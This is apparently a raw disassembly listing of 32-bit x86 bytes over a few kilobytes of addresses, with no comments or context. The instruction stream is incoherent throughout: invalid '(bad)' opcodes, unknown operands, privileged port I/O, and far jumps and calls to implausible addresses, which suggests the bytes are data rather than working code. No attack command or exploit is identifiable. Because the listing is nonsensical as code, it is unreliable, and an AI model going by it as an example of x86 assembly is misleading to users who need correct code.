  417760:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417761:	mov    ds:0xb43e5e58,eax
  417766:	sbb    dh,al
  417768:	adc    esi,ebx
  41776a:	mov    ecx,0x1cdc5674
  41776f:	addr16 xor eax,0xc8eee847
  417775:	mov    bl,0xd8
  417777:	into   
  417778:	and    cl,cl
  41777a:	cmp    cl,al
  41777c:	and    BYTE PTR [ebx],0xc0
  41777f:	stos   DWORD PTR es:[edi],eax
  417780:	in     eax,0xa2
  417782:	or     eax,DWORD PTR [esi]
  417784:	stos   BYTE PTR es:[edi],al
  417785:	xchg   bl,ch
  417787:	pushf  
  417788:	scas   eax,DWORD PTR es:[edi]
  417789:	push   esp
  41778a:	int3   
  41778b:	int    0x25
  41778d:	or     edi,DWORD PTR [edi-0x68a6469c]
  417793:	and    BYTE PTR [eax-0x78ad404f],cl
  417799:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41779a:	sub    eax,esi
  41779c:	mov    bl,dl
  41779e:	dec    edi
  41779f:	push   0xa804a924
  4177a4:	push   ecx
  4177a5:	push   edi
  4177a6:	ret    
  4177a7:	cli    
  4177a8:	xchg   esi,eax
  4177a9:	mov    al,ds:0xd599ae5b
  4177ae:	jno    0x4177d0
  4177b0:	push   ecx
  4177b1:	ret    
  4177b2:	lahf   
  4177b3:	out    0x51,eax
  4177b5:	or     DWORD PTR [edx-0x450e8ce9],ebx
  4177bb:	in     al,0xde
  4177bd:	popf   
  4177be:	mov    ebx,DWORD PTR [edx+edi*8+0x5882c042]
  4177c5:	xor    esi,ebp
  4177c7:	inc    esi
  4177c8:	fidiv  WORD PTR [ebx-0x48]
  4177cb:	mov    ah,0x6e
  4177cd:	adc    ebx,ebp
  4177cf:	jns    0x417766
  4177d1:	jmp    0x1e7a:0x1e5e6d2
  4177d8:	pop    ds
  4177d9:	mov    DWORD PTR [ecx-0x11b331db],esp
  4177df:	repnz sbb DWORD PTR [ebx+0x7232220b],0xffffffa7
  4177e7:	scas   al,BYTE PTR es:[edi]
  4177e8:	in     al,0x20
  4177ea:	sub    al,0x51
  4177ec:	in     eax,dx
  4177ed:	sbb    dh,BYTE PTR [ebx-0x2ef6dbd1]
  4177f3:	stc    
  4177f4:	ins    BYTE PTR es:[edi],dx
  4177f5:	aad    0x4e
  4177f7:	ret    
  4177f8:	adc    eax,0xdaf269eb
  4177fd:	fidivr WORD PTR [esi]
  4177ff:	jmp    0x417823
  417801:	test   eax,0x6ffa194e
  417806:	jle    0x4177ab
  417808:	xor    eax,0x4b863bce
  41780d:	xor    al,0x23
  41780f:	lock and al,0x13
  417812:	shl    eax,0x8a
  417815:	pop    edx
  417816:	mov    bl,0x19
  417818:	sbb    ch,BYTE PTR [ecx]
  41781a:	mov    ebp,0xa3e52705
  417820:	jne    0x4177b4
  417822:	or     esi,edx
  417824:	outs   dx,BYTE PTR ds:[esi]
  417825:	push   esp
  417826:	popf   
  417827:	(bad)  
  417828:	adc    ebx,DWORD PTR [edx]
  41782a:	test   BYTE PTR [ebx+0x65],cl
  41782d:	push   ss
  41782e:	fmul   QWORD PTR [edx+0x24]
  417831:	cmp    BYTE PTR [ecx+0x3bff798a],cl
  417837:	mov    dl,0x3e
  417839:	imul   ebx,DWORD PTR [edx+0xd6ea2e5],0x67
  417840:	(bad)  
  417841:	aas    
  417842:	(bad)  
  417843:	push   ss
  417844:	mul    DWORD PTR [esi]
  417846:	inc    edi
  417847:	scas   eax,DWORD PTR es:[edi]
  417848:	inc    esp
  417849:	call   0xcd78:0xa045456b
  417850:	lods   al,BYTE PTR ds:[esi]
  417851:	push   0x25
  417853:	imul   ebx,DWORD PTR [ecx],0xe25bc0a4
  417859:	addr16 mov cl,0xb4
  41785c:	stc    
  41785d:	mov    ecx,0xa02511a9
  417862:	loope  0x417853
  417864:	xchg   esi,eax
  417865:	pop    esp
  417866:	mov    esi,edx
  417868:	sbb    ecx,DWORD PTR [ecx-0x12f28c53]
  41786e:	loopne 0x417890
  417870:	shl    DWORD PTR [edi+0x66ca44eb],0xa7
  417877:	rcl    BYTE PTR [edx-0x677a2ae3],0x3a
  41787e:	mov    bh,0xd4
  417880:	repz mov bl,0xb4
  417883:	add    edx,DWORD PTR [esi+0x65]
  417886:	mov    esp,0x6d4519d9
  41788b:	pop    eax
  41788c:	dec    esp
  41788d:	and    BYTE PTR [ebx-0x4514ff38],0xe4
  417894:	add    BYTE PTR [eax-0x420ab12b],0x88
  41789b:	in     al,dx
  41789c:	mov    BYTE PTR [ebp+0x2b],dh
  41789f:	imul   ebx,DWORD PTR ds:0x680313c9,0x548531f9
  4178a9:	pushf  
  4178aa:	stos   DWORD PTR es:[edi],eax
  4178ab:	cmp    eax,0xfdea560
  4178b0:	rcr    ah,0x6a
  4178b3:	loopne 0x4178ba
  4178b5:	sub    esi,DWORD PTR [esi+0x44]
  4178b8:	and    al,BYTE PTR ds:0x663e4c71
  4178be:	cmp    eax,0x86658680
  4178c3:	arpl   si,si
  4178c5:	push   ss
  4178c6:	and    dl,BYTE PTR [esi+0x6b]
  4178c9:	inc    ecx
  4178ca:	push   edx
  4178cb:	out    dx,eax
  4178cc:	sbb    BYTE PTR [ecx-0x3e50353c],ch
  4178d2:	imul   ebx,DWORD PTR [eax-0x4b],0xffffffb0
  4178d6:	sbb    esp,DWORD PTR [ebp+0x210abf52]
  4178dc:	push   0x1a08dae2
  4178e1:	leave  
  4178e2:	mov    ah,bl
  4178e4:	shl    BYTE PTR ds:0xdf0337,1
  4178ea:	cmp    al,BYTE PTR [eiz*2-0x4c0c4d25]
  4178f1:	shl    BYTE PTR [edi],cl
  4178f3:	add    DWORD PTR [esi+0x39],ecx
  4178f6:	add    ah,BYTE PTR [ecx]
  4178f8:	xchg   BYTE PTR [esi-0x37],ah
  4178fb:	daa    
  4178fc:	xchg   edx,eax
  4178fd:	(bad)  
  4178fe:	cli    
  4178ff:	push   0xfffffff6
  417901:	adc    ah,ch
  417903:	(bad)  
  417904:	adc    ebx,DWORD PTR [ebx+0x77ad0f07]
  41790a:	(bad)  
  41790b:	mov    ah,0x1d
  41790d:	jmp    0x5842cd6f
  417912:	mov    ecx,0x8aa25ee5
  417917:	aaa    
  417918:	xlat   BYTE PTR ds:[ebx]
  417919:	sti    
  41791a:	mov    eax,0x6db05acb
  41791f:	fld    QWORD PTR [eax+eax*4-0x45]
  417923:	ss push eax
  417925:	sub    DWORD PTR [eax-0x57e121ec],ebp
  41792b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41792c:	nop
  41792d:	fimul  DWORD PTR [eax-0x7f47ba14]
  417933:	repnz retf 0xac8a
  417937:	xchg   BYTE PTR [edx],dh
  417939:	adc    BYTE PTR [eax+0x1c],bh
  41793c:	loopne 0x417927
  41793e:	mov    edx,0xdcde1434
  417943:	and    al,0x5
  417945:	pop    ebx
  417946:	addr16 jmp 0x4178d4
  417949:	aam    0xd8
  41794b:	dec    ecx
  41794c:	pop    ds
  41794d:	or     DWORD PTR [edx+0x11dd18f],esp
  417953:	xchg   esi,eax
  417954:	push   esp
  417955:	gs pusha 
  417957:	lods   eax,DWORD PTR ds:[esi]
  417958:	sbb    ch,BYTE PTR [ecx]
  41795a:	mov    ch,0xf5
  41795c:	call   0xa00974d8
  417961:	push   cs
  417962:	mov    ch,0x8c
  417964:	push   edi
  417965:	shl    BYTE PTR [eax-0x43697c33],1
  41796b:	or     al,0x41
  41796d:	cwde   
  41796e:	arpl   WORD PTR [esi],ax
  417970:	out    0x58,eax
  417972:	pcmpeqw mm7,QWORD PTR [ebp-0x5f]
  417976:	ja     0x4179ea
  417978:	sbb    bh,cl
  41797a:	push   edi
  41797b:	push   eax
  41797c:	inc    ebx
  41797d:	dec    ebp
  41797e:	int3   
  41797f:	aad    0x68
  417981:	sbb    eax,0x591b375f
  417986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417987:	push   edi
  417988:	and    al,0x9e
  41798a:	jge    0x4179f3
  41798c:	sbb    BYTE PTR [ecx-0xe113f16],bl
  417992:	mov    al,BYTE PTR [edx+edx*4+0x4238aba6]
  417999:	jmp    0xce8f:0xb3e75f7d
  4179a0:	iret   
  4179a1:	sub    al,0xc2
  4179a3:	hlt    
  4179a4:	mov    ecx,0x9d7878b8
  4179a9:	loopne 0x417a26
  4179ab:	cmp    DWORD PTR [esi],0xc1cf0c57
  4179b1:	loop   0x4179d8
  4179b3:	in     al,dx
  4179b4:	sbb    BYTE PTR [ecx+0x7231bb62],cl
  4179ba:	mov    DWORD PTR [esi-0x22],ebp
  4179bd:	mov    eax,ds:0xd8194f7b
  4179c2:	cmp    ebp,edx
  4179c4:	enter  0x2ed0,0x9b
  4179c8:	mul    DWORD PTR [edi-0x5f]
  4179cb:	adc    eax,0x287d5eec
  4179d0:	xchg   ebx,eax
  4179d1:	and    al,0xe7
  4179d3:	jo     0x417a43
  4179d5:	pushf  
  4179d6:	sbb    ecx,ecx
  4179d8:	pop    esp
  4179d9:	push   ecx
  4179da:	and    bl,ah
  4179dc:	outs   dx,DWORD PTR ds:[esi]
  4179dd:	sub    ecx,DWORD PTR [eax-0x4857d0fd]
  4179e3:	test   BYTE PTR [edi+edx*4],al
  4179e6:	push   es
  4179e7:	sub    eax,0xf454d8f5
  4179ec:	sbb    BYTE PTR [ebp-0x6e3d4b8],bl
  4179f2:	test   al,0x31
  4179f4:	or     dh,BYTE PTR [ebx]
  4179f6:	mov    BYTE PTR [ebp-0x77],cl
  4179f9:	stos   DWORD PTR es:[edi],eax
  4179fa:	stos   DWORD PTR es:[edi],eax
  4179fb:	cdq    
  4179fc:	jo     0x4179f0
  4179fe:	aas    
  4179ff:	or     esi,DWORD PTR [ebp+0x217ac820]
  417a05:	imul   ecx,DWORD PTR [ebp-0x2b],0xb0207366
  417a0c:	stc    
  417a0d:	jno    0x417a0c
  417a0f:	mov    al,0xf9
  417a11:	popf   
  417a12:	pmaddwd mm2,QWORD PTR [edx+0x61d4e869]
  417a19:	jns    0x4179e2
  417a1b:	imul   edx,DWORD PTR [edi],0x68
  417a1e:	cs cld 
  417a20:	sub    ebx,DWORD PTR [edi+0x29db30b2]
  417a26:	imul   esi,DWORD PTR [ebx+0x20],0x51
  417a2a:	(bad)  
  417a2b:	hlt    
  417a2c:	adc    al,0x66
  417a2e:	cmp    DWORD PTR [ebp-0x4a],edx
  417a31:	enter  0xdc8c,0xb6
  417a35:	test   al,0xbd
  417a37:	and    al,0x64
  417a39:	and    DWORD PTR [ecx+0x1ba29d18],eax
  417a3f:	outs   dx,BYTE PTR ds:[esi]
  417a40:	mov    BYTE PTR [edi],dh
  417a42:	jb     0x417a50
  417a44:	jge    0x417a04
  417a46:	je     0x4179cd
  417a48:	lahf   
  417a49:	fwait
  417a4a:	xor    edi,eax
  417a4c:	inc    ebp
  417a4d:	fisub  WORD PTR [esi-0x10d36856]
  417a53:	adc    al,0x23
  417a55:	test   eax,0x61dea9e4
  417a5a:	or     cl,cl
  417a5c:	and    BYTE PTR [ecx],cl
  417a5e:	add    edx,DWORD PTR [ebp-0x35]
  417a61:	mov    eax,ds:0x888deaa2
  417a66:	das    
  417a67:	ficomp WORD PTR [ebx]
  417a69:	test   eax,0x1bcd294
  417a6e:	inc    eax
  417a6f:	ret    0x9921
  417a72:	add    esi,0x699fbfc5
  417a78:	hlt    
  417a79:	xchg   esi,eax
  417a7a:	sub    edi,ecx
  417a7c:	cmp    DWORD PTR [edx],0x392903bf
  417a82:	in     al,0xb2
  417a84:	mov    eax,ds:0x6458bde6
  417a89:	inc    ebx
  417a8a:	stos   BYTE PTR es:[edi],al
  417a8b:	imul   ebp,ebp,0xa004b98a
  417a91:	dec    esp
  417a92:	scas   al,BYTE PTR es:[edi]
  417a93:	pop    ds
  417a94:	cmc    
  417a95:	dec    ebx
  417a96:	sbb    ch,cl
  417a98:	inc    eax
  417a99:	pop    eax
  417a9a:	pusha  
  417a9b:	cmp    edi,edx
  417a9d:	jmp    0xa4bbed60
  417aa2:	addr16 loop 0x417a49
  417aa5:	cwde   
  417aa6:	(bad)  
  417aa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417aa9:	hlt    
  417aaa:	push   edx
  417aab:	add    BYTE PTR [ecx+edi*4+0x15b21f50],cl
  417ab2:	jg     0x417a64
  417ab4:	inc    edx
  417ab5:	push   esi
  417ab6:	mov    al,0xa4
  417ab8:	pop    es
  417ab9:	lock xor ebp,DWORD PTR ds:0xeb94d1d5
  417ac0:	adc    dh,BYTE PTR [ebx+0x1cd021ea]
  417ac6:	push   0xa836564b
  417acb:	jl     0x417ac2
  417acd:	fmul   QWORD PTR [edx]
  417acf:	out    0xd6,eax
  417ad1:	call   0xdcfe:0x23934c8b
  417ad8:	int3   
  417ad9:	imul   eax,esp,0xb6da3191
  417adf:	(bad)  
  417ae0:	loopne 0x417a85
  417ae2:	inc    ecx
  417ae3:	inc    ebp
  417ae4:	mov    DWORD PTR [esi+0xf],ebp
  417ae7:	(bad)  
  417ae8:	lods   eax,DWORD PTR ds:[esi]
  417ae9:	pop    esp
  417aea:	mov    ecx,0x7a25ec8c
  417aef:	repz cwde 
  417af1:	jo     0x417b65
  417af3:	test   DWORD PTR [ecx],ebp
  417af5:	mov    eax,ds:0x1f8c323b
  417afa:	test   BYTE PTR [edx-0x20],al
  417afd:	and    ebx,esp
  417aff:	(bad)  
  417b01:	push   edx
  417b02:	mov    ah,0x34
  417b04:	inc    edx
  417b05:	or     al,0xbe
  417b07:	push   ebx
  417b08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b09:	repnz ss loopne 0x417b62
  417b0d:	cmp    DWORD PTR [edx],ebx
  417b0f:	or     al,0x39
  417b11:	xchg   ebp,eax
  417b12:	cmp    al,0x4
  417b14:	jb     0x417b3f
  417b16:	aad    0xba
  417b18:	sub    eax,0x1ef0f585
  417b1d:	sub    esp,edi
  417b1f:	(bad)  
  417b20:	daa    
  417b21:	sub    bh,BYTE PTR [edi+0x1bb07f16]
  417b27:	out    0xce,eax
  417b29:	call   0x17ab7861
  417b2e:	sbb    DWORD PTR [ebp+eiz*1+0x26061d7],esp
  417b35:	cmp    cl,bl
  417b37:	push   ecx
  417b38:	push   edi
  417b39:	fwait
  417b3a:	xchg   ebp,eax
  417b3b:	dec    esp
  417b3c:	sbb    eax,0x25597feb
  417b41:	(bad)  
  417b42:	aad    0xf0
  417b44:	iret   
  417b45:	jl     0x417bb2
  417b47:	dec    ebp
  417b48:	arpl   WORD PTR [ecx+0x21],bp
  417b4b:	or     DWORD PTR [ebx+0x66],esp
  417b4e:	inc    edi
  417b4f:	stos   BYTE PTR es:[edi],al
  417b50:	lock xor al,0xb8
  417b53:	loopne 0x417bba
  417b55:	adc    BYTE PTR [ecx],dl
  417b57:	icebp  
  417b58:	dec    ebp
  417b59:	dec    edi
  417b5a:	aad    0x90
  417b5c:	sbb    cl,BYTE PTR [ecx+0x41]
  417b5f:	jmp    0x417bd0
  417b61:	ins    DWORD PTR es:[edi],dx
  417b62:	xchg   ebp,eax
  417b63:	and    ebx,DWORD PTR [esi+0x50c45b9d]
  417b69:	or     al,ah
  417b6b:	jbe    0x417b4f
  417b6d:	mov    edx,DWORD PTR [ebp+0x25]
  417b70:	(bad)  
  417b72:	mov    al,0xc4
  417b74:	fsubr  st(6),st
  417b76:	mov    edx,0x73283568
  417b7b:	icebp  
  417b7c:	pop    ss
  417b7d:	sbb    ebp,DWORD PTR [ebx-0x5c]
  417b80:	and    ecx,DWORD PTR [ecx]
  417b82:	and    al,0x91
  417b84:	add    DWORD PTR [esi-0x5846f966],ebp
  417b8a:	dec    ebx
  417b8b:	cmp    eax,0x73a3fd07
  417b90:	add    al,0x98
  417b92:	les    esi,FWORD PTR [edi-0x2a9b057b]
  417b98:	gs mov ch,0x34
  417b9b:	jmp    0xf376:0x383a3bc2
  417ba2:	hlt    
  417ba3:	adc    al,0x61
  417ba5:	mov    dh,0x67
  417ba7:	sub    al,0xaf
  417ba9:	shl    BYTE PTR [eax],1
  417bab:	(bad)
  417bb0:	out    dx,al
  417bb1:	aaa    
  417bb2:	mov    ds:0x50a5d51b,al
  417bb7:	repz lds edx,FWORD PTR [eax-0x73229d96]
  417bbe:	lahf   
  417bbf:	adc    DWORD PTR [ebp-0x54],esi
  417bc2:	arpl   ax,si
  417bc4:	xchg   ebx,edx
  417bc6:	cmp    al,dh
  417bc8:	xchg   ebp,eax
  417bc9:	inc    eax
  417bca:	jno    0x417bb2
  417bcc:	cmp    BYTE PTR [edi+0x481623b6],al
  417bd2:	inc    esi
  417bd3:	repnz std 
  417bd5:	sub    ah,BYTE PTR [eax-0x4013127b]
  417bdb:	out    0x7f,eax
  417bdd:	call   0x7ab4:0xc25cbcbb
  417be4:	enter  0x3c84,0x33
  417be8:	jmp    0x417c1e
  417bea:	mov    ebp,0xd4b7b164
  417bef:	pop    ss
  417bf0:	xor    eax,0xdeecda69
  417bf5:	sub    edi,DWORD PTR [edi+0x3e]
  417bf8:	inc    edi
  417bf9:	pop    ecx
  417bfa:	pusha  
  417bfb:	scas   al,BYTE PTR es:[edi]
  417bfc:	cmc    
  417bfd:	mov    edx,0xddcdc3ef
  417c02:	(bad)  
  417c03:	in     eax,0xf9
  417c05:	adc    ch,BYTE PTR [ecx-0x4c00078d]
  417c0b:	xor    al,0xeb
  417c0d:	fwait
  417c0e:	ins    BYTE PTR es:[edi],dx
  417c0f:	adc    ebx,DWORD PTR [eax]
  417c11:	xchg   ebp,eax
  417c12:	mov    edi,0x65f7f914
  417c17:	cmc    
  417c18:	in     eax,0x26
  417c1a:	xlat   BYTE PTR ds:[ebx]
  417c1b:	in     al,dx
  417c1c:	inc    ebx
  417c1d:	sub    ch,dh
  417c1f:	jo     0x417c46
  417c21:	mov    DWORD PTR [ebp+0x74fb9ba],edi
  417c27:	popa   
  417c28:	xlat   BYTE PTR ds:[ebx]
  417c29:	xchg   edi,eax
  417c2a:	pop    ebp
  417c2b:	and    eax,0x6dd39f72
  417c30:	hlt    
  417c31:	xor    edx,DWORD PTR [ebx-0x31]
  417c34:	and    ebx,DWORD PTR [ecx+0x13368834]
  417c3a:	or     eax,DWORD PTR [ecx+ebp*8-0x5e]
  417c3e:	sbb    eax,DWORD PTR [ecx]
  417c40:	xchg   DWORD PTR [edi-0x592b586a],esp
  417c46:	pop    ss
  417c47:	sti    
  417c48:	pop    edi
  417c49:	add    edi,DWORD PTR [edx+0x61209f4]
  417c4f:	out    dx,al
  417c50:	mov    dh,0x69
  417c52:	jno    0x417c73
  417c54:	cwd    
  417c56:	jbe    0x417c65
  417c58:	sbb    eax,0x6ed368d4
  417c5d:	test   eax,0x9b1bbdd0
  417c62:	adc    eax,0xbf303005
  417c67:	int3   
  417c68:	push   ebp
  417c69:	jae    0x417c0a
  417c6b:	jmp    0xa7b0:0x3acd0296
  417c72:	adc    al,ah
  417c74:	sub    BYTE PTR [ecx],cl
  417c76:	mov    bh,0x2a
  417c78:	xchg   ebp,eax
  417c79:	mov    ebx,0xdb22298e
  417c7e:	in     al,dx
  417c7f:	inc    ecx
  417c80:	fistp  DWORD PTR ss:[eax+eiz*1-0x5f91602]
  417c88:	sbb    al,0xe6
  417c8a:	mov    ebx,0xb126af1e
  417c8f:	fs jno 0x417c57
  417c92:	jp     0x417c9d
  417c94:	mov    dh,0x46
  417c96:	sbb    eax,0x38d2be55
  417c9b:	or     DWORD PTR [ebp-0x57b5738a],ebx
  417ca1:	ror    BYTE PTR [edi],1
  417ca3:	sbb    ebp,DWORD PTR [ecx+0x36]
  417ca6:	mov    al,0x64
  417ca8:	aas    
  417ca9:	pop    edx
  417caa:	push   cs
  417cab:	loopne 0x417d12
  417cad:	mov    edx,0xb8e4f147
  417cb2:	ret    
  417cb3:	adc    esp,esp
  417cb5:	or     al,0x6b
  417cb7:	cmp    eax,0xf370f7ad
  417cbc:	out    0x28,eax
  417cbe:	or     dh,BYTE PTR [ebp-0x6b]
  417cc1:	jle    0x417d1f
  417cc3:	out    0x76,al
  417cc5:	mov    bl,0xc4
  417cc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cc8:	push   esp
  417cc9:	sub    DWORD PTR [edi],ebp
  417ccb:	stos   BYTE PTR es:[edi],al
  417ccc:	or     cl,bl
  417cce:	das    
  417ccf:	lock and al,0xa4
  417cd2:	cs pop eax
  417cd4:	cdq    
  417cd5:	js     0x417cd4
  417cd7:	jmp    0xddfa:0xfe87d5aa
  417cde:	inc    edi
  417cdf:	mov    dh,0x4c
  417ce1:	mov    DWORD PTR [ebp-0x4926da6d],esi
  417ce7:	rcr    DWORD PTR [ebx+0x69],cl
  417cea:	lods   al,BYTE PTR ds:[esi]
  417ceb:	addr16 push ecx
  417ced:	test   al,0x3b
  417cef:	stc    
  417cf0:	xchg   ebx,eax
  417cf1:	mov    ch,0xe
  417cf3:	sbb    bl,cl
  417cf5:	addr16 dec esp
  417cf7:	mov    WORD PTR [esi-0x77],es
  417cfa:	sbb    BYTE PTR [ecx*4-0x3fd3aa18],0x94
  417d02:	clc    
  417d03:	push   0xed307455
  417d08:	and    al,0x94
  417d0a:	dec    esi
  417d0b:	xlat   BYTE PTR ds:[ebx]
  417d0c:	sbb    ch,BYTE PTR [ecx]
  417d0e:	mov    eax,0xa1c3df49
  417d13:	ins    BYTE PTR es:[edi],dx
  417d14:	push   ecx
  417d15:	pop    ecx
  417d16:	iret   
  417d17:	in     al,0x1c
  417d19:	fstp   DWORD PTR [edi-0x12]
  417d1c:	int3   
  417d1d:	pop    ebx
  417d1e:	jl     0x417d3d
  417d20:	and    eax,0x5d15e169
  417d25:	daa    
  417d26:	popa   
  417d27:	scas   al,BYTE PTR es:[edi]
  417d28:	cld    
  417d29:	mov    ds:0xec22b46b,eax
  417d2e:	push   eax
  417d2f:	xchg   ebp,eax
  417d30:	and    ebp,DWORD PTR [edi]
  417d32:	pop    es
  417d33:	ror    BYTE PTR [eax-0x68bb34c4],0x18
  417d3a:	mov    DWORD PTR [edx+0x40],ebx
  417d3d:	mov    al,ds:0x30f51bbb
  417d42:	outs   dx,DWORD PTR ds:[esi]
  417d43:	jns    0x417cf9
  417d45:	ror    BYTE PTR [ebp-0xe],0x12
  417d49:	pop    esi
  417d4a:	mov    bh,0x64
  417d4c:	aam    0xab
  417d4e:	sbb    eax,0x5b9d7d6d
  417d53:	je     0x417d4a
  417d55:	push   ecx
  417d56:	nop    ecx
  417d59:	dec    edx
  417d5a:	or     ecx,edx
  417d5c:	mov    esp,0x16c69dd1
  417d61:	in     eax,0x94
  417d63:	mov    esi,0x2602c599
  417d68:	pop    ecx
  417d69:	xchg   edi,eax
  417d6a:	xchg   BYTE PTR [edx+0x74b35755],al
  417d70:	clc    
  417d71:	push   ebx
  417d72:	inc    edi
  417d73:	lods   al,BYTE PTR ds:[esi]
  417d74:	push   edx
  417d75:	in     al,0xb5
  417d77:	mov    ah,0xad
  417d79:	sub    bh,cl
  417d7b:	dec    esp
  417d7c:	test   BYTE PTR [esi-0x39285165],dh
  417d82:	jmp    0x417de1
  417d84:	lock stos BYTE PTR es:[edi],al
  417d86:	cwde   
  417d87:	mov    bh,0xc2
  417d89:	and    DWORD PTR [edi-0x4fe2251a],esp
  417d8f:	in     al,0x36
  417d91:	inc    ebx
  417d92:	push   0x8d12a5c2
  417d97:	icebp  
  417d98:	mov    bl,0xbb
  417d9a:	mov    dl,0x17
  417d9c:	xlat   BYTE PTR ds:[ebx]
  417d9d:	or     cl,BYTE PTR [esi+0x6811f04]
  417da3:	outs   dx,BYTE PTR ds:[esi]
  417da4:	fdiv   DWORD PTR [esi]
  417da6:	shl    ch,1
  417da8:	gs fs or bh,ch
  417dac:	call   0xa699:0x22892218
  417db3:	jg     0x417d96
  417db5:	push   0x46
  417db7:	dec    esi
  417db8:	xchg   edi,eax
  417db9:	call   0x5ba5:0xe61707ab
  417dc0:	inc    esp
  417dc1:	mov    dh,0xba
  417dc3:	mov    edx,ebx
  417dc5:	test   DWORD PTR [ecx+ecx*2-0x47],edi
  417dc9:	mov    ?,WORD PTR [edi]
  417dcb:	and    ecx,DWORD PTR [eax+0x4f]
  417dce:	mov    edx,0xf71dddf4
  417dd3:	dec    ebp
  417dd4:	push   es
  417dd5:	mov    ds:0x26fd1a9d,al
  417dda:	xor    al,0x59
  417ddc:	pop    ss
  417ddd:	in     eax,dx
  417dde:	fcmovnb st,st(2)
  417de0:	pop    ss
  417de1:	leave  
  417de2:	push   edx
  417de3:	add    eax,0xd38903a2
  417de8:	xchg   BYTE PTR [ecx-0x6bf6be35],ah
  417dee:	cwde   
  417def:	xchg   ebx,eax
  417df0:	jne    0x417d88
  417df2:	sbb    al,0xb
  417df4:	mov    esp,0xedc56922
  417df9:	sahf   
  417dfa:	push   edx
  417dfb:	lock inc eax
  417dfd:	call   0x9514:0x12939ebb
  417e04:	int3   
  417e05:	sti    
  417e06:	scas   al,BYTE PTR es:[edi]
  417e07:	xchg   esi,eax
  417e08:	xor    eax,0xa8f4b28c
  417e0d:	add    al,0x85
  417e0f:	das    
  417e10:	test   BYTE PTR [ecx],ah
  417e12:	add    edi,esp
  417e14:	and    cl,BYTE PTR [ecx+0xd963717]
  417e1a:	jne    0x417db2
  417e1c:	sbb    BYTE PTR [ecx-0x6cce85e3],ch
  417e22:	mul    BYTE PTR ds:0x344b9a26
  417e28:	and    cl,BYTE PTR [edx-0x1e]
  417e2b:	cmc    
  417e2c:	push   eax
  417e2d:	cmc    
  417e2e:	ffree  st(3)
  417e30:	xor    al,0x9d
  417e32:	mov    eax,0x28877d74
  417e37:	push   ebp
  417e38:	test   DWORD PTR [ebx-0x57],ecx
  417e3b:	out    0xd7,eax
  417e3d:	les    eax,FWORD PTR [ecx+0x3b191fad]
  417e43:	sub    BYTE PTR [eax-0x4],dh
  417e46:	mov    edx,0x3d0a089c
  417e4b:	adc    DWORD PTR [ebx],eax
  417e4d:	mov    ds:0x3026d01b,eax
  417e52:	sub    DWORD PTR [eax-0x27c4a6e3],ebp
  417e58:	ins    DWORD PTR es:[edi],dx
  417e59:	sar    BYTE PTR [edx],0x62
  417e5c:	mov    ?,WORD PTR [edi+0xd]
  417e5f:	adc    DWORD PTR ss:[edx+0x55f0e38f],esp
  417e66:	das    
  417e67:	out    dx,eax
  417e68:	sbb    BYTE PTR [ecx+0x545c8ed1],bh
  417e6e:	mov    ecx,0x2b9b7957
  417e73:	pop    ebp
  417e74:	test   BYTE PTR [esi+0x51],ch
  417e77:	inc    ebp
  417e78:	sbb    al,0xbb
  417e7a:	fbld   TBYTE PTR gs:[eax+0x5954b118]
  417e81:	dec    eax
  417e82:	inc    ecx
  417e83:	cmp    DWORD PTR [esi-0x4e],esi
  417e86:	mov    edi,0x66a5705b
  417e8b:	cmp    bl,bl
  417e8d:	mov    dh,0xbe
  417e8f:	ss xchg edx,eax
  417e91:	mov    ds:0xba65a83b,al
  417e96:	mov    bl,ah
  417e98:	add    BYTE PTR [ebx+edx*2],ah
  417e9b:	mov    ds:0xfe454215,eax
  417ea0:	cld    
  417ea1:	fstp   DWORD PTR [ebp+0x57]
  417ea4:	dec    esp
  417ea5:	hlt    
  417ea6:	das    
  417ea7:	jmp    0x188d1982
  417eac:	in     al,dx
  417ead:	or     BYTE PTR [edi],al
  417eaf:	popf   
  417eb0:	clc    
  417eb1:	mov    ds:0xf7e4926b,al
  417eb6:	mov    al,0x6
  417eb8:	pop    esi
  417eb9:	mov    ch,0x6c
  417ebb:	int3   
  417ebc:	mov    al,ds:0xd1d4b4f6
  417ec1:	push   ss
  417ec2:	outs   dx,DWORD PTR ds:[esi]
  417ec3:	mov    eax,DWORD PTR [esi-0x18]
  417ec6:	dec    ebx
  417ec7:	add    ebp,DWORD PTR [edi+0x53f1580e]
  417ecd:	adc    al,0x36
  417ecf:	xor    DWORD PTR [edx-0x75c8697],edx
  417ed5:	dec    esp
  417ed6:	mov    ds:0xba7b0f4e,eax
  417edb:	rol    BYTE PTR [edi+ebx*4],0x8b
  417edf:	dec    ebp
  417ee0:	test   BYTE PTR [esi-0x23f85c2e],ah
  417ee6:	je     0x417f66
  417ee8:	push   0x92b4b527
  417eed:	ret    
  417eee:	pop    ebp
  417eef:	jne    0x417f36
  417ef1:	xchg   BYTE PTR [ecx-0x10],ah
  417ef4:	add    ebx,DWORD PTR [eax]
  417ef6:	das    
  417ef7:	xchg   esi,eax
  417ef8:	and    eax,0xf243faf9
  417efd:	jmp    0xa29d21da
  417f02:	imul   edi,DWORD PTR [ebx-0x7c1210bf],0x74
  417f09:	ja     0x417f51
  417f0b:	lods   eax,DWORD PTR ds:[esi]
  417f0c:	push   ds
  417f0d:	call   0x5b7db98d
  417f12:	mov    bh,0xbd
  417f14:	sahf   
  417f15:	mov    ebx,0xae75f0ba
  417f1a:	sub    ch,bh
  417f1c:	dec    esi
  417f1d:	repz not DWORD PTR [edi]
  417f20:	and    al,0x39
  417f22:	inc    ebp
  417f23:	nop
  417f24:	mov    ah,0xfb
  417f26:	pop    edi
  417f27:	adc    BYTE PTR [ebx-0x59],0x9b
  417f2b:	cdq    
  417f2c:	scas   al,BYTE PTR es:[edi]
  417f2d:	xchg   ecx,eax
  417f2e:	ins    BYTE PTR es:[edi],dx
  417f2f:	mov    edx,0x5d255b17
  417f34:	mov    ss,WORD PTR [ebx-0x6b]
  417f37:	mov    si,0xe1e4
  417f3b:	and    al,0xd5
  417f3d:	retf   0x69b5
  417f40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f41:	push   ss
  417f42:	jne    0x417fa1
  417f44:	cmp    BYTE PTR [ebp-0x57bdd2b3],bl
  417f4a:	and    ch,BYTE PTR [ecx+ebp*2-0x7]
